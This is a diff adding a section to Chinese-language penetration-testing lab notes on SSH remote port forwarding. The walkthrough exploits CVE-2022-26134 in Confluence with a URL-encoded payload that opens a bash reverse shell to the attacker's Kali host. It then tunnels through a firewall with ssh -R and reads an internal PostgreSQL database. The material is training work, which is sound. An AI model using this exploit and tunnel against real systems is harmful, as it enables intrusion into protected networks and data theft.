@@ -1899,3 +1899,161 @@ Nmap done: 1 IP address (1 host up) scanned in 244.76 seconds
 >降低 Proxychains 設定檔中的 `tcp_read_time_out` 和 `tcp_connect_time_out` 可以使 Proxychains 加快連接埠掃描時間。
 
 ### SSH Remote Port Forwarding
+透過 Dynamic Port Forwarding 已經能夠在 CONFLUENCE01 的 WAN interface 上綁定的任何 port，但在 real world 的 firewalls (包含軟體與硬體) 會變成阻礙。Inbound traffic 會比 outbound traffic 限制更多。🥚 雖然 attacker 無法綁定端口讓外部直接連入，仍然可以利用 SSH 遠端轉發來繞過這些限制，建立反向通道。
+這也是 SSH [remote port forwarding](https://man.openbsd.org/ssh#R) 實用的地方，attacker 可以在目標機器執行 remote shell payload，連回 attacker 監聽中的 SSH server。
+
+[回到 LAB 範例]\
+一樣使用 CVE-2022-26134 塞入 reverse shell，但環境中新增防火牆規則：`只允許 TCP 8090 Inbound; All out bound`。後端環境與 socat 相同，需要透過 5432 port 連接到 PostgreSQL database。
+![image](https://hackmd.io/_uploads/By6NuJVske.png)
+因為防火牆規則，我們無法在 CONFLUENCE01 上開啟監聽 port。
+嘗試在 Kali 上設定 SSH server，讓 CONFLUENCE01 連回 Kali。
+1. 讓 CONFLUENCE01 SSH 連線到 Kali，並在 Kali 綁定一個 port (ex. 上圖中 2345 port)
+2. 所有發送到 Kali 2345 port 的請求，都會透過 SSH Tunnel 轉發到 CONFLUENCE01，然後再送到 PGDATABASE01（10.4.195.215:5432）。
+3. Kali 就能存取內部的 PostgreSQL 服務，即使它原本受防火牆保護、無法直接存取。
+
+#### 1. start the Kali SSH server
+```
+┌──(chw㉿CHW)-[~]
+└─$ ip a
+...
+9: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    link/none 
+    inet 192.168.45.182/24 scope global tun0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::ac14:a08e:7658:5796/64 scope link stable-privacy proto kernel_ll 
+       valid_lft forever preferred_lft forever
+                                                                                                
+┌──(chw㉿CHW)-[~]
+└─$ sudo systemctl start ssh
+[sudo] password for chw:
+```
+檢查是否成功開啟
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo ss -ntplu
+Netid     State      Recv-Q     Send-Q         Local Address:Port          Peer Address:Port    Process        
+...
+tcp       LISTEN     0          128                  0.0.0.0:22                 0.0.0.0:*        users:(("sshd",pid=237930,fd=3))                                                               
+tcp       LISTEN     0          128                     [::]:22                    [::]:*        users:(("sshd",pid=237930,fd=4)) 
+```
+> listening port 22 on all interfaces for both IPv4 and IPv6.
+
+#### 2. 建立交互式的 TTY shell
+一樣在 target machine 注入 reverse shell
+```
+┌──(chw㉿CHW)-[~]
+└─$ curl http://192.168.195.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/8888%200%3E%261%27%29.start%28%29%22%29%7D/
+```
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.195.63] 45516
+bash: cannot set terminal process group (2665): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'   
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
+$ 
+```
+
+#### 3. 設定 SSH remote port forward
+>[!Tip]
+>要讓 Target machine 透過 SSH 密碼驗證連回 Kali，在 Kali 中的 `/etc/ssh/sshd_config` 需要設定 `PasswordAuthentication yes`
+
+```
+$ ssh -N -R 127.0.0.1:2345:10.4.195.215:5432 chw@192.168.45.182
+ssh -N -R 127.0.0.1:2345:10.4.195.215:5432 chw@192.168.45.182
+Could not create directory '/home/confluence/.ssh'.
+The authenticity of host '192.168.45.182 (192.168.45.182)' can't be established.
+ECDSA key fingerprint is SHA256:Atuf88ckgvdjD92PblnxCBvzAiN1jtxNUv6woYcEmxg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+chw@192.168.45.182's password: *********
+
+
+```
+> `-N` ：只建立 SSH 連線，不執行遠端 Shell\
+`-R 127.0.0.1:2345:10.4.195.215:5432 chw@192.168.45.182`：
+> - Kali 機器（192.168.45.182） 會在 127.0.0.1:2345 開啟一個端口
+> - 所有發送到 127.0.0.1:2345 的流量，會透過 SSH Tunnel 轉發到 10.4.195.215:5432（PostgreSQL Server）
+> - chw@192.168.45.182：SSH 連線到 Kali 機器，使用 chw 帳號
+
+>[!Note]
+>比較 `Local Port Forwarding`, `Dynamic Port Forwarding` 與 `Remote Port Forwarding`\
+>![image](https://hackmd.io/_uploads/B1MxxlEjJx.png)
+
+
+確認啟用狀況：
+```
+┌──(chw㉿CHW)-[~]
+└─$ ss -ntplu
+Netid   State    Recv-Q    Send-Q       Local Address:Port        Peer Address:Port   Process   
+...
+tcp     LISTEN   0         128                0.0.0.0:22               0.0.0.0:*                
+tcp     LISTEN   0         128              127.0.0.1:2345             0.0.0.0:*                
+tcp     LISTEN   0         128                   [::]:22                  [::]:*
+```
+> 成功打通 remote port forwarding
+
+![image](https://hackmd.io/_uploads/H1ealg4ike.png)
+
+#### 4. 使用 psql 登入 PGDATABASE01
+在 Kali 本機利用 psql 連線 (SSH remote port forward 打通的 2345 port)
+```
+┌──(chw㉿CHW)-[~]
+└─$ psql -h 127.0.0.1 -p 2345 -U postgres
+Password for user postgres: 
+psql (16.3 (Debian 16.3-1+b1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
+Type "help" for help.
+
+postgres=# \l
+                                                        List of databases
+    Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | ICU Locale | ICU Rules |   Access privileges   
+------------+----------+----------+-----------------+-------------+-------------+------------+-----------+-----------------------
+ confluence | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
+ hr_backup  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
+ postgres   | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
+ template0  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
+            |          |          |                 |             |             |            |           | postgres=CTc/postgres
+ template1  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
+            |          |          |                 |             |             |            |           | postgres=CTc/postgres
+(5 rows)
+postgres=# \c hr_backup
+psql (16.3 (Debian 16.3-1+b1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
+You are now connected to database "hr_backup" as user "postgres".
+hr_backup=# SELECT * FROM payroll;
+ id |                 flag                 
+----+--------------------------------------
+  0 | ************************************
+```
+> `\l`: 列出所有資料庫\
+> `\c hr_backup`: 切換至 hr_backup 資料庫\
+> `\dt`: 查看所有 table
+> ```
+> hr_backup=# \dt
+>          List of relations
+> Schema |  Name   | Type  |  Owner   
+>--------+---------+-------+----------
+> public | payroll | table | postgres
+>(1 row)
+> ```
+> `\d payroll`: 查看 table 結構
+> ```
+>hr_backup=# \d payroll
+>                   Table "public.payroll"
+> Column |       Type        | Collation | Nullable | >Default 
+>--------+-------------------+-----------+----------+---------
+> id     | integer           |           | not null | 
+> flag   | character varying |           |          | 
+>Indexes:
+>    "payroll_pkey" PRIMARY KEY, btree (id)
+> ```
+
+### SSH Remote Dynamic Port Forwarding
